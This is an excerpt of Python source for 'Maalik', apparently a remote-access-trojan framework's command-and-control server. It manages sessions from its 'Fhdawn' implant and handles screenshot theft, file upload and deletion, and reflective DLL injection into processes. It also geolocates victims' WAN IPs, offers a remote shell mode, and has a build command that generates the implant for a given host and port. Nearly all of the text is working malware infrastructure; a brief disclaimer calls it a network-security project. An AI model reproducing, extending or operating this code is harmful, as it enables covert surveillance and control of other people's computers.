                            #print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Downloading file '{fl}' in '{fd}'".format(fl=filename, fd=FinalF))
                            while(len(data) != filesize):
                                data += self.client_socket.recv(filesize - len(data))  
                                #print("data = " + str(len(data)) + " filesize = " + str(filesize))
                                if not data: break
                            incoming_file.write(data)
                            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Screenshot saved to '{fl}'".format(fl=FinalF))
                            saveAndShowImage(FinalF) 
                                  
                    except Exception as e:
                        print("[X] Error : " + str(e))
                        print("[i] Screenshot Download Information : " + client_data)
                        # Rare case, This will only happen if Fhdawn has sent invalid triggers.
                        print("[i] Please report this bug to developer with the information above.")
                        pass
                
                # File was recevied by Fhdawn
                elif(client_data.startswith("F_OK")):
                    try:
                        fileinfo = client_data.split(",") # split info by comma
                        print(
                            Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] Uploaded {filename} ({filesize} bytes) to '{remote_path}' ..."
                            .format(filename = fileinfo[1], filesize = fileinfo[2], remote_path = fileinfo[3]))

                    except Exception as Error:
                        print("[X] Error : " + str(Error))
                        print("[i] File Received Information : " + client_data)
                        # Rare case, This will only happen if Fhdawn has sent invalid triggers.
                        print("[i] Please report this bug to developer with the information above.")
                        pass

                # Reflective DLL Injection was successfully done    
                elif(client_data.startswith("DLL_OK")):
                    try:
                        fileinfo = client_data.split(":")
                        print(Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] Injected Reflective DLL into PID " + fileinfo[1] + " ...")

                    except Exception as Error:
                        print("[X] Error : " + str(Error))
                        print("[i] Reflective DLL Inject Information : " + client_data)
                        # Rare case, This will only happen if Fhdawn has sent invalid triggers.
                        print("[i] Please report this bug to developer with the information above.")
                        pass
                
                # Get Wanip, geolocate

                elif(client_data.startswith("WANIP")):
                    try:
                        fileinfo = client_data.split(":")
                        print(Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] WAN IP : " + fileinfo[1] + " ...")
                        GeoLocate(fileinfo[1])
                    except Exception as Error:
                        print("[X] Error : " + str(Error))
                        print("[i] Geolocation Information : " + client_data)
                        # Rare case, This will only happen if Fhdawn has sent invalid triggers.
                        print("[i] Please report this bug to developer with the information above.")
                        pass
                elif(client_data.startswith("DEL_OK")):
                    try:
                        fileinfo = client_data.split(",")
                        print( "[" + Fore.LIGHTGREEN_EX + Style.BRIGHT + "i" + Style.RESET_ALL + "] File '{file}' deleted from '{pth}' ..." .format(file = fileinfo[1], pth = fileinfo[2] ))

                    except Exception as Error:
                        print("[X] Error : " + str(Error))
                        print("[i] File Delete Information : " + client_data)
                        # Rare case, This will only happen if Fhdawn has sent invalid triggers.
                        print("[i] Please report this bug to developer with the information above.")
                        pass
                elif(shellmode == True):
                    print("\n"+client_data) # No other information

                elif(silent == False):
                    print("\n["+ Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] {ips} : ".format(ips = ips) + client_data)
                    
            except Exception as e:
                self._clearKick()
                print("[X] Error : " + str(e))
                break
            except UnicodeDecodeError as ude:
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Unicode Decode error : " + str(ude))
            except UnicodeEncodeError as eEe:
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Unicode Encode error : " + str(eEe))
            except ConnectionAbortedError as cAe:
                self._clearKick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(cAe))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break

            except ConnectionError as cE:
                self._clearKick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(cE))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break

            except ConnectionRefusedError as cRe:
                self._clearKick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(cRe))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break

            except ConnectionResetError as cRetwo:
                self._clearKick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(cRetwo))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break

            except socket.error as se:
                   
                self._clearKick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(se))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break
            
            except Exception as recv_error:
                self._clearKick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(recv_error))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break



def TCPServer():
    global iplist
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 5)

    host = setting('host')
    port = int(setting('port'))

    try:
        server.bind((host, port))
    except PermissionError:
        print("[X] No Permission to bind.")
        exit(True)
    except Exception as i:
        raise i

    try:
        server.listen(1)
    except Exception as S:
        raise S

    #print("[I] Server Running.")
    while(True):
        client, addr = server.accept()
        client.send("fhdawn_host".encode())
        try:
            host = client.recv(1024).decode() # Receive User PC ' Test / TEST-PC '. I call this host. And all of these are saved in hostList
            if("/" not in host):
                print(Style.BRIGHT + Fore.YELLOW + "[ WARNING ] " + Style.RESET_ALL + "Client has sent an invalid User PC. This *may* not be Fhdawn.")
        except Exception as e:
            print(str(e))
            break
        cld = ClientManage(client)
        clients.append(client)
        client_ip = str(addr[0]) +":"+ str(addr[1])
        iplist.append(client_ip)
        hostList.append(host)
        print( Style.BRIGHT + Fore.GREEN + "\n[ Session Opened ] " + Style.RESET_ALL + cld.returnClientInfo())
        _thread.start_new_thread(cld.ClientThread, ())
        notify("New Session Opened", "A New session has opened to : " + client_ip + " on Host " + host)


def Console():
    global iplist
    def SendData(csocket, data):
        csocket = int(csocket)
        sockfd = clients[csocket]
        
        try:
            sockfd.send(data.encode())
        except Exception as error:
            clients.remove(sockfd)
            print("Error Occured : " + str(error))

    def list_bots():
        print("\nActive Sessions (" + str(len(clients)) +")")
        print("===================================")
        try:
            if(len(clients) > 0): 
                for i in range(len(iplist)):
                    print(  
                        "\n[ SESSION ID : "+str(i) +" ][ Connection : "+iplist[i] + " ][ " + hostList[i] + " ]" 
                        )
        except Exception as stre:
            print("Error : " + str(stre))

    clear_screen()
    print(banner.format(makered = Style.BRIGHT + Fore.LIGHTRED_EX, makebright = Style.RESET_ALL + Style.BRIGHT, ver = current_version()))
    _thread.start_new_thread(TCPServer, ()) 
    global silent
    while(True):
        try:
            if(silent == False):
                promptstr = "maalik >> "
                x = prompt(promptstr)
                args = x.split()
                if(x == "list" or x == "sessions"):
                    list_bots()
                elif(x.startswith("session")):
                    try:
                        cid = args[1]
                        sock = clients[int(cid)]
                        sess = ClientManage(sock)
                        sess.Session()
                    except IndexError:
                        print("USAGE : session < client id >")
                # enable in tests
                # elif(x.startswith("send")):
                #     try:
                #         cid = args[1]
                #         SendData(cid, args[2])
                #     except IndexError:
                #         print("USAGE : send <id> <data>")
                elif(x == "exit"):
                    sys.exit(1)
                elif(x == "help"):
                    print(Style.BRIGHT + Fore.GREEN + 
                        """
                        Maalik Framework
                        ---------------
                        -> Commands : 
                        -. help - Print this help message.
                        -. sessions - View online clients.
                        -. session - interact with a session.
                        -. build - Build Fhdawn.
                        -. kill - Kill session.
                        -. exit - Exit Maalik.

                        Use the help command inside a session to view Session specific help.

                        ~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=
                        Created by : QuantumCore (Fahad) 
                        Website : https://quantumcored.com
                        Email : quantumcore@protonmail.com
                        Discord : https://discordapp.com/invite/8snh7nx
                        Github Repository : https://github.com/quantumcored/maalik

                        If you find any bugs, Please Report them here : https://github.com/quantumcored/maalik/issues
                        ~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=
                        The Developer is not responsible for any misuse of Damage caused by the program. This is created only to innovate Network Security and YOU.
                        """
                        + Style.RESET_ALL)
                elif(x == "build"):
                    host = prompt("[+] Host : ")
                    port = prompt("[+] Port : ")
                    if(len(host) > 0 and len(port) > 0):
                        Build(host, port)
                        
                elif(x.startswith("kill")):
                    try:
                        cid = int(args[1])
                        SendData(cid, "kill")
                        clients[cid].shutdown(socket.SHUT_RDWR)
                        clients[cid].close()
                        
                    except IndexError:
                        print("USAGE : kill <session id>")

                else:
                    if(len(x) > 0):
                        try:
                            print(Style.BRIGHT + Fore.LIGHTCYAN_EX )
                            subprocess.run(['bash', '-c', x])
                            print(Style.RESET_ALL)
                        except Exception as procError:
                            print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Error : " + str(procError))
        except KeyboardInterrupt:
            print("[X] Interrupt, Type exit to Exit.")

           